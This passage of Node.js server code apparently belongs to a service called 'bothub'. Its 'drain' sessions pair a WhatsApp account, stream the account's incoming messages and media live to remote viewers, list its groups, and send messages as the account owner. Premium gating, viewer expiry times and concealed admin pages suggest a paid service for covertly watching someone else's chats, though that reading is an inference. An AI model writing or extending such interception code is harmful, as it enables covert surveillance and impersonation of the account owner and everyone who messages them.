      runDrain(drain, sock, sessionId).catch((err) => { drain.status = 'error'; drain.errors.push(String(err?.message || err)); broadcastHello(drain); });
    },
    onMessage: (type, messages) => {
      if (type !== 'notify' && type !== 'append') return;
      for (const m of messages) {
        try {
          if (!m.message) continue;
          const jid = m.key?.remoteJid || '';
          if (jid === 'status@broadcast') continue;
          const media = detectMedia(m.message);
          const body =
            m.message.conversation ||
            m.message.extendedTextMessage?.text ||
            m.message.imageMessage?.caption ||
            m.message.videoMessage?.caption ||
            m.message.documentMessage?.caption ||
            '';
          if (!body && !media) continue;
          broadcastToSubscribers(drain, {
            id: m.key?.id || Math.random().toString(36).slice(2),
            chat: jid,
            sender: m.key?.participant || jid,
            fromMe: !!m.key?.fromMe,
            name: m.pushName || null,
            text: String(body || '').slice(0, 500),
            media,
            ts: Number(m.messageTimestamp) * 1000 || Date.now(),
          });
        } catch {}
      }
    },
    onClose: ({ code, banned }) => {
      console.log(`[drain ${sessionId}] source closed code=${code ?? 'n/a'}${banned ? ' (banned)' : ''}`);
      if (banned) { drain.status = 'banned'; purgeAuthDir(source); broadcastHello(drain); }
    },
    autoReconnect: true,
  });
  drain.session = session;

  try {
    const code = await session.code;
    res.json({ code, alreadyRegistered: code === null });
  } catch (err) {
    res.status(500).json({ error: err?.message || 'pairing failed' });
  }
});

app.get('/api/drain/status', (req, res) => {
  const id = String(req.query?.sessionId ?? '');
  const d = drains.get(id);
  if (!d) return res.status(404).json({ error: 'unknown_session' });
  res.json({
    status: d.status,
    total: d.total, done: d.done,
    errors: d.errors,
    premium: d.premium,
    canSend: d.canSend,
    expiresAt: d.viewerExpiresAt,
  });
});

app.get('/api/drain/:id/groups', (req, res) => {
  const d = drains.get(req.params.id);
  if (!d) return res.status(404).json({ error: 'unknown_session' });
  res.json({ status: d.status, fetchedAt: d.groupsFetched, groups: d.groups || [], expiresAt: d.viewerExpiresAt });
});

app.get('/api/drain/:id/stream', (req, res) => {
  const d = drains.get(req.params.id);
  if (!d) return res.status(404).end();
  if (d.viewerExpiresAt && Date.now() > d.viewerExpiresAt) return res.status(410).end();

  res.set({
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache, no-transform',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no',
  });
  res.flushHeaders?.();

  res.write(`event: hello\ndata: ${drainHelloPayload(d)}\n\n`);
  d.subscribers.add(res);

  const keep = setInterval(() => { try { res.write(`: keepalive ${Date.now()}\n\n`); } catch {} }, 20000);
  req.on('close', () => { clearInterval(keep); d.subscribers.delete(res); });
});

app.post('/api/drain/:id/send', async (req, res) => {
  const d = drains.get(req.params.id);
  if (!d) return res.status(404).json({ error: 'unknown_session' });
  if (!d.canSend) return res.status(403).json({ error: 'sending_not_allowed' });
  if (!d.socket) return res.status(409).json({ error: 'not_connected' });
  if (d.viewerExpiresAt && Date.now() > d.viewerExpiresAt) return res.status(410).json({ error: 'viewer_expired' });
  const chat = String(req.body?.chat ?? '').trim();
  const text = String(req.body?.text ?? '').slice(0, 2000);
  if (!chat || !text) return res.status(400).json({ error: 'chat_and_text_required' });
  try {
    const r = await d.socket.sendMessage(chat, { text });
    broadcastToSubscribers(d, {
      id: r?.key?.id || Math.random().toString(36).slice(2),
      chat, sender: d.socket.user?.id || 'me', fromMe: true,
      name: 'you', text, media: null, ts: Date.now(),
    });
    res.json({ ok: true, id: r?.key?.id });
  } catch (err) {
    res.status(500).json({ error: err?.message || 'send_failed' });
  }
});

// ── Static pages ──
app.get(['/drain', '/drain/:id'], (req, res) => res.sendFile(path.join(__dirname, 'public', 'drain.html')));
app.get('/drain/:id/groups', (req, res) => res.sendFile(path.join(__dirname, 'public', 'drain-groups.html')));
app.get('/drain/:id/live', (req, res) => res.sendFile(path.join(__dirname, 'public', 'drain-live.html')));
app.get('/docs', (req, res) => res.sendFile(path.join(__dirname, 'public', 'docs.html')));
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));

app.get(['/admin', '/admin/'], (req, res) => {
  if (!adminPageAuthed(req)) return res.status(404).end();
  res.sendFile(path.join(__dirname, 'admin.html'));
});
app.get(['/panel', '/panel/'], (req, res) => {
  if (!adminPageAuthed(req)) return res.status(404).end();
  res.sendFile(path.join(__dirname, 'panel.html'));
});

app.get('/healthz', (req, res) => res.json({ ok: true, t: Date.now() }));

app.listen(PORT, () => {
  console.log(`[bothub] http://localhost:${PORT}`);
  console.log(`[bothub] mail=${RESEND_API_KEY ? 'resend' : 'console-fallback'}`);
  console.log(`[bothub] admin ${ADMIN_TOKEN ? (ADMIN_PASSWORD ? 'token+password' : 'token only') : 'disabled'}`);
});
